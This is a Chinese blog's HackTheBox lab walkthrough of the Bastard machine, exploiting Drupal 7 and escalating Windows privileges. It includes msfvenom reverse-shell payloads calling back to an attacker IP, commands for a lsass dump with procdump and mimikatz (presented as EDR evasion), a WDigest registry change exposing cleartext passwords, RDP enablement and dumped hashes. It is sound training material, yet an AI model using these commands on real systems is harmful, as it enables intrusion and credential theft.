@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近在玩 HackTheBox 上的靶机，觉得还是可以学到不少东西，下面就由如果也有想玩靶机的师傅，可以去注册个帐号玩玩，它注册的时候也需要完成一个类似 CTF 的题，还蛮有意思的。下面进入正题靶机地址10.10.10.9 信息收集80 跑的一个drupal，之前某靶场遇到过，用 msf 里 rce 的 exp 打一下，失败了 NMAP12345678910111213141516171819#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox：Bastard 笔记">
+<meta property="og:url" content="http://unc1e.com/2020/04/15/yuque/HackTheBox%EF%BC%9ABastard%20%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Unc1e的博客">
+<meta property="og:description" content="最近在玩 HackTheBox 上的靶机，觉得还是可以学到不少东西，下面就由如果也有想玩靶机的师傅，可以去注册个帐号玩玩，它注册的时候也需要完成一个类似 CTF 的题，还蛮有意思的。下面进入正题靶机地址10.10.10.9 信息收集80 跑的一个drupal，之前某靶场遇到过，用 msf 里 rce 的 exp 打一下，失败了 NMAP12345678910111213141516171819#">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587124122471-8f43fcd0-7c5a-4be4-96a8-2f27ab2de635.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=893&size=157418&status=done&style=none&width=446.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118777861-a016a5fb-bf1c-4139-8946-a3e7fd7db479.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=879&originWidth=1284&size=83182&status=done&style=none&width=642">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587060858392-69fc71fa-0cdc-49ff-bcac-04371601d3e3.png#align=left&display=inline&height=425&margin=%5Bobject%20Object%5D&name=image.png&originHeight=850&originWidth=1055&size=105857&status=done&style=none&width=528">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587059785848-cd640ec9-f850-4b00-93b6-e6eed764887d.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=1919&size=65150&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061602899-47a23321-ad14-4b91-b4de-ccb57369fbc0.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=1454&size=41373&status=done&style=none&width=727">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061518084-62ef4fae-c7b9-4f5b-a55c-ecaed24e1b0f.png#align=left&display=inline&height=360&margin=%5Bobject%20Object%5D&name=image.png&originHeight=927&originWidth=1919&size=186816&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118423587-e1b3a276-30f4-45a4-8b6a-a7e51a11afd4.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1109&size=62408&status=done&style=none&width=555">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102168225-8112a6b1-a418-4df5-8ed6-678a5306ca7e.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1783&size=114804&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587101700488-b0ad6e39-c734-4ae6-bac9-94aca645fb63.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=1078&size=43635&status=done&style=none&width=539">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587104941645-1ee0b0d0-6e6f-4dd1-98be-e430100c3bae.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=320&originWidth=1919&size=55109&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102459105-4ec2f0ce-81dd-4de2-ba27-080feae280de.png#align=left&display=inline&height=287&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=705&size=77260&status=done&style=none&width=353">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587066521634-e4f0b478-3cb5-4cd9-94cc-090ae6a6b8c7.png#align=left&display=inline&height=333&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1918&size=154513&status=done&style=none&width=746">
+<meta property="article:published_time" content="2020-04-15T13:49:28.000Z">
+<meta property="article:modified_time" content="2020-07-16T02:35:52.290Z">
+<meta property="article:author" content="Unc1e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1587124122471-8f43fcd0-7c5a-4be4-96a8-2f27ab2de635.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=893&size=157418&status=done&style=none&width=446.5">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://unc1e.com/2020/04/15/yuque/HackTheBox：Bastard 笔记/"/>
+
+
+
+
+
+  <title>HackTheBox：Bastard 笔记 | Unc1e的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Unc1e的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/15/yuque/HackTheBox%EF%BC%9ABastard%20%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Unc1e">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Unc1e的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HackTheBox：Bastard 笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-15T21:49:28+08:00">
+                2020-04-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近在<strong>玩 H</strong>ack<strong>T</strong>he<strong>B</strong>ox 上的靶机，觉得还是可以学到不少东西，下面就由<br>如果也有想玩靶机的师傅，可以去注册个帐号玩玩，它注册的时候也需要完成一个类似 CTF 的题，还蛮有意思的。<br>下面进入正题<br><strong>靶机地址</strong><code>10.10.10.9</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587124122471-8f43fcd0-7c5a-4be4-96a8-2f27ab2de635.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=893&size=157418&status=done&style=none&width=446.5" alt="image.png"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118777861-a016a5fb-bf1c-4139-8946-a3e7fd7db479.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=879&originWidth=1284&size=83182&status=done&style=none&width=642" alt="image.png"><br>80 跑的一个<code>drupal</code>，之前某靶场遇到过，用 msf 里 rce 的 exp 打一下，失败了</p>
+<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -sV -sC -Pn  -oA  scans/nmap-allports.tcp 10.10.10.9</span></span><br><span class="line">Nmap scan report for 10.10.10.9</span><br><span class="line">Host is up (0.49s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Microsoft IIS httpd 7.5</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-<span class="keyword">server</span>-header: Microsoft-IIS/<span class="number">7.5</span></span><br><span class="line">|_http-title: Welcome <span class="keyword">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.9</span> | <span class="number">10.10</span><span class="number">.10</span><span class="number">.9</span></span><br><span class="line"><span class="number">135</span>/tcp   <span class="keyword">open</span>  msrpc   Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp <span class="keyword">open</span>  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><strong>-sC</strong>:使用 nmap 默认的脚本扫描</li>
+<li><strong>-sV</strong>: 确定操作系统版本</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>-<strong>Pn</strong>: 不 ping 直接扫</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>-oA</strong>:输出扫描结果到指定文件夹</li>
+</ul>
+</blockquote>
+<p>拿到 Drupal 的大版本 7 之后，要确定小版本，看到 NMAP 扫出来一些静态文件，找到了版本是<code>7.54</code><br>用<code>searchsploit drupal 7</code> 找，最终确定这几个</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.x Module Services - Remote Code Execution  | exploits/php/webapps/41564.php</span><br><span class="line">Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)     | exploits/php/webapps/44557.rb</span><br><span class="line">Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)  | exploits/php/webapps/44542.txt</span><br><span class="line">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Ex | exploits/php/webapps/44449.rb</span><br></pre></td></tr></table></figure>
+
+<p>用以下代码<code>searchsploit -m exploits/php/webapps/41564.php</code>拷贝 exp 到当前目录，更改一下路径为<code>/rest</code><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587060858392-69fc71fa-0cdc-49ff-bcac-04371601d3e3.png#align=left&display=inline&height=425&margin=%5Bobject%20Object%5D&name=image.png&originHeight=850&originWidth=1055&size=105857&status=done&style=none&width=528" alt="image.png"><br>这里<code>/rest</code>的路径，其实是需要用<code>dirb</code>或者<code>dirbuster</code>来爆的，不过我因为延迟很大就没有扫，直接从别人的 wp 知道的，运行 exp，就可以得到 webshell 了。</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到 webshell 之后，用信息收集脚本<code>WinPEAS</code>(<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a>)一通收集，加上自己一直在尝试，确定了几个可用的提权方式</p>
+<h2 id="提权：MS15-051"><a href="#提权：MS15-051" class="headerlink" title="提权：MS15-051"></a>提权：MS15-051</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=<span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span> LPORT=<span class="number">4444</span> &gt; msf64.exe^C</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler  \</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp \</span><br><span class="line">set  lhost</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，x64 和 x86 的 listener 是不一样的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587059785848-cd640ec9-f850-4b00-93b6-e6eed764887d.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=1919&size=65150&status=done&style=none&width=746" alt="image.png"><br>默认是 x86 的 shell，<strong>失败</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061602899-47a23321-ad14-4b91-b4de-ccb57369fbc0.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=1454&size=41373&status=done&style=none&width=727" alt="image.png"></p>
+<p>而在 x64 的 shell 内提权，<strong>成功</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061518084-62ef4fae-c7b9-4f5b-a55c-ecaed24e1b0f.png#align=left&display=inline&height=360&margin=%5Bobject%20Object%5D&name=image.png&originHeight=927&originWidth=1919&size=186816&status=done&style=none&width=746" alt="image.png"></p>
+<h2 id="提权：MS10-059"><a href="#提权：MS10-059" class="headerlink" title="提权：MS10-059"></a>提权：MS10-059</h2><p>这个在 msf 里并没有对应的利用模块，不过在 github 上找到了<a href="https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe" target="_blank" rel="noopener">https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe</a>，是可用的提权 exe</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chimichurri.exe <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span> <span class="number">4443</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118423587-e1b3a276-30f4-45a4-8b6a-a7e51a11afd4.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1109&size=62408&status=done&style=none&width=555" alt="image.png"><br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059</a></p>
+<h2 id="提权：MS14-058"><a href="#提权：MS14-058" class="headerlink" title="提权：MS14-058"></a>提权：MS14-058</h2><blockquote>
+<p>2014-10-30 消息</p>
+</blockquote>
+<blockquote>
+<p>由 CrowStrike 发现，使用了半年多的 Windows 本地提权漏洞 MS14-058(CVE-2014-4113)工具已经公开。<br>其提权成功率达到 100%:</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102168225-8112a6b1-a418-4df5-8ed6-678a5306ca7e.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1783&size=114804&status=done&style=none&width=746" alt="image.png"></p>
+<p>后来接上了 cs 常识提权。不过不知什么缘故，只有 80 端口可以建立 cs 的会话，443、4444 或 8888 端口均无法反弹<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587101700488-b0ad6e39-c734-4ae6-bac9-94aca645fb63.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=1078&size=43635&status=done&style=none&width=539" alt="image.png"><br>直接上<code>ms14-058</code>，可以看到成功提权为<code>system</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587104941645-1ee0b0d0-6e6f-4dd1-98be-e430100c3bae.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=320&originWidth=1919&size=55109&status=done&style=none&width=746" alt="image.png"></p>
+<h1 id="之后的玩法"><a href="#之后的玩法" class="headerlink" title="之后的玩法"></a>之后的玩法</h1><p>用<code>webshell</code>找到帐号密码，进数据库玩玩，admin 的密码是<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102459105-4ec2f0ce-81dd-4de2-ba27-080feae280de.png#align=left&display=inline&height=287&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=705&size=77260&status=done&style=none&width=353" alt="image.png"><br>cmd5 无法解密，但是可以参考<a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">drupal-reset-password</a>，将其更改为已知密码 123456 的密文，登录后台看有无上传 shell 的点（后面发现，后台其实也有能拿 shell 的地方，但是对这个靶机没有意义了，毕竟不是 sql 注入进来的）</p>
+<h2 id="开-3389-进远程桌面"><a href="#开-3389-进远程桌面" class="headerlink" title="开 3389 进远程桌面"></a>开 3389 进远程桌面</h2><p><code>meterpreter</code>里开<code>rdp</code>远程桌面</p>
+<p><code>run getgui -h</code>可以看添加用户的格式，注意密码的强度要到位</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Win7、Win2003、XP 系统</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 在 CMD 命令行开启 3389 端口：</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="section">## 在 CMD 命令行关闭 3389 端口（将 00000000 改成 11111111 即可）：</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587066521634-e4f0b478-3cb5-4cd9-94cc-090ae6a6b8c7.png#align=left&display=inline&height=333&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1918&size=154513&status=done&style=none&width=746" alt="image.png"><br>直接进 rdp 了</p>
+<h2 id="抓-hash"><a href="#抓-hash" class="headerlink" title="抓 hash"></a>抓 hash</h2><p>一般而言，我在 windows 下抓<code>hash</code>会用 2 种方法：<br>第一种，在<code>meterpreter</code>的会话里直接<strong><code>hashdump</code></strong>，或者开 coablt strike 直接<code>run mimikatz</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::</span><br><span class="line">dimitris:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">57544</span>bb8930967eee7f44d46f8bfe59d:::</span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>我个人偏向于第二种<strong>:转储<code>lsass.exe</code>文件</strong>，拖回本地用<code>mimikatz</code>来读<code>hash</code>。这种方法的好处是不用对<code>mimikatz</code>进行免杀，因为实战环境的内网里一般都有<code>EDR</code>，遇到个人主机运行 mimikatz 这种行为，肯定是会报异常的，搞不好权限就要丢失，这时候就适宜用拖这种转储文件回本地的办法来抓 hash。<br><strong>prodump.exe 工具</strong><br>该工具是微软出品的工具，具有一定免杀效果。可以利用 procdump 把 lsass 进程的内存文件导出本地，再在本地利用 mimikatz 读取密码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转储lsass</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass_dump</span><br><span class="line"></span><br><span class="line"><span class="comment">#lsass_dump.dmp为保存dump数据的文件</span></span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass_dump.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> exit</span><br></pre></td></tr></table></figure>
+
+<p>另外，当系统为 win10 或 2012R2 以上时，<strong>默认在内存缓存中禁止保存明文密码</strong>，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><ul>
+<li><p>其实搞这个靶机，最困难的步骤还是 找到 <code>drupal 7</code>的那个 RCE，网上很多人使用这两款工具来对<code>drupal</code>进行有针对的扫描，<a href="https://github.com/topics/drupalgeddon2" target="_blank" rel="noopener">https://github.com/topics/drupalgeddon2</a>和<a href="https://github.com/droope/droopescan" target="_blank" rel="noopener">https://github.com/droope/droopescan</a>，也可以确定到这个漏洞，有兴趣的朋友不妨试试</p>
+</li>
+<li><p><code>Drupal 7</code>的配置文件（数据库密码）路径为<code>/sites/default/settings.php</code></p>
+</li>
+<li><p><code>Drupal</code>的具体版本可在<code>/CHANGELOG.txt</code>中确定，其它 CMS 类似思路，多找找 readme 之类的文件</p>
+</li>
+<li><p>如果想改 Drupal 的管理员密码，找到表 users，找到里面的用户名对应的密码框。可以直接复制其他用户的密码到忘记密码的账户上面。还可以直接复制（这段加密代码明文是：123456，稍后用这个密码登录即可）：</p>
+</li>
+</ul>
+<p><code>$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4</code></p>
+<ul>
+<li>Windows 补丁一览表</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">漏洞列表</span><br><span class="line"></span><br><span class="line"><span class="comment">#Security Bulletin   #KB     #Description    #Operating System</span></span><br><span class="line"></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-0213</span> 　[Windows COM Elevation of Privilege Vulnerability]　　(windows <span class="number">10</span>/<span class="number">8.1</span>/<span class="number">7</span>/<span class="number">2016</span>/<span class="number">2010</span>/<span class="number">2008</span>)</span><br><span class="line">MS17<span class="number">-010</span> 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows <span class="number">7</span>/<span class="number">2008</span>/<span class="number">2003</span>/XP)</span><br><span class="line">MS16<span class="number">-135</span> 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(<span class="number">2016</span>)</span><br><span class="line">MS16<span class="number">-098</span> 　[KB3178466]　　[Kernel Driver]　　(Win <span class="number">8.1</span>)</span><br><span class="line">MS16<span class="number">-075</span> 　[KB3164038]　　[Hot Potato]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-032</span> 　[KB3143141]　　[Secondary Logon Handle]　　(<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">10</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-016</span> 　[KB3136041]　　[WebDAV]　　(<span class="number">2008</span>/Vista/<span class="number">7</span>)</span><br><span class="line">MS15<span class="number">-097</span> 　[KB3089656]　　[remote code execution]　　(win8<span class="number">.1</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-076</span> 　[KB3067505]　　[RPC]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-077</span> 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/<span class="number">2000</span>/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-061</span> 　[KB3057839]　　[Kernel Driver]　　(<span 